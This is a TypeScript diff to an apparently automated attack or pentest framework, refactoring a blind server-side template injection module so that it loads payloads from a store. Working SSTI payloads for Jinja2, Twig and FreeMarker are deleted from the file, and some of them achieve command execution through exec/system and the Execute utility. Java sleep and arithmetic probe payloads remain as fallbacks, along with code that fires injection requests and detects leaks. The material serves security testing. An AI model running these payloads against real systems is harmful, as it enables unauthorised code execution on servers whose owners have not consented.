@@ -11,25 +11,9 @@
 import type { TechniquePrimitive, TechniqueContext, AttackStep, StepExecutionResult, PrimitiveResult } from './framework'
 import { claimFor } from './framework'
 import { EvidenceGate } from '../intelligence/evidence-gate'
+import { getPayloadStore } from '../payloads/store'
 
-// Engine → time payload (data, chosen by fingerprint id; defaults to generic).
-const ENGINE_TIME: Record<string, string> = {
-  jinja2: '{{ ().__class__.__base__.__subclasses__()[40]().__init__.__globals__["__builtins__"]["__import__"]("time").sleep(5) }}',
-  twig: '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("system")("sleep 5")}}',
-  freemarker: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep 5")}',
-  ognl: '%{3*3}',
-  handlebars: '{{#sleep 5}}{{/sleep}}',
-  generic: '${T(java.lang.Thread).sleep(5000)}',
-}
-const ENGINE_ERROR: Record<string, string> = {
-  jinja2: '{{7*7}}',
-  twig: '{{7*7}}',
-  freemarker: '<#if 7*7==49>leak</#if>',
-  ognl: '%{7*7}',
-  handlebars: '{{7*7}}',
-  generic: '${7*7}',
-}
-const SSTI_ERROR_MARKERS = ['template', 'jinja', 'freemarker', 'twig', 'handlebars', 'ognl', 'mustache', 'render', 'velocity', 'syntaxerror']
+const SSTI_ERROR_MARKERS = () => getPayloadStore().getMarkers('ssti/generic')
 
 function urlWithParam(url: string, param: string, value: string): string {
   try { const u = new URL(url); u.searchParams.set(param, value); return u.toString() } catch { return url }
@@ -52,10 +36,14 @@ export const sstiBlind: TechniquePrimitive = {
     // frameworkFingerprint result (if any) selects the engine; else try all.
     const engine = (ctx.state?.templateEngine as string) || ctx.fingerprint || 'generic'
     const steps: AttackStep[] = []
-    const engines = Object.keys(ENGINE_TIME).filter((e) => e !== 'generic')
+    const timeVariants = getPayloadStore().listVariants('ssti/blind-engines')
+    const engines = timeVariants.filter((e) => e !== 'generic_time' && !e.endsWith('_time'))
+    const engineKey = (e: string) => `${e}_time`
     ;[engine, 'generic', ...engines].slice(0, 4).forEach((eng) => {
-      const timePayload = ENGINE_TIME[eng] ?? ENGINE_TIME.generic
-      const errPayload = ENGINE_ERROR[eng] ?? ENGINE_ERROR.generic
+      const timePayloads = getPayloadStore().getPayloads('ssti/blind-engines', engineKey(eng))
+      const errPayloads = getPayloadStore().getPayloads('ssti/engines', eng === 'generic' ? 'generic' : eng)
+      const timePayload = timePayloads[0] ?? '${T(java.lang.Thread).sleep(5000)}'
+      const errPayload = errPayloads[0] ?? '${7*7}'
       const timeUrl = urlWithParam(url, param, timePayload)
       const timeBody = method !== 'GET' ? JSON.stringify({ [param]: timePayload }) : undefined
       steps.push({
@@ -89,7 +77,8 @@ export const sstiBlind: TechniquePrimitive = {
       }
       if (kind === 'ssti-err') {
         const lower = (r.body ?? '').toLowerCase()
-        const leaked = SSTI_ERROR_MARKERS.some((m) => lower.includes(m)) || (r.body ?? '').includes('49')
+        const markers = SSTI_ERROR_MARKERS()
+        const leaked = markers.some((m) => lower.includes(m)) || (r.body ?? '').includes('49')
         if (leaked) {
           errHit = true
           evidence.push({ kind: 'response', label: `SSTI error-based (${r.step.metadata?.engine}) ${r.step.request.method} ${r.step.request.url} → ${r.status}`, data: (r.body ?? '').slice(0, 1000) })
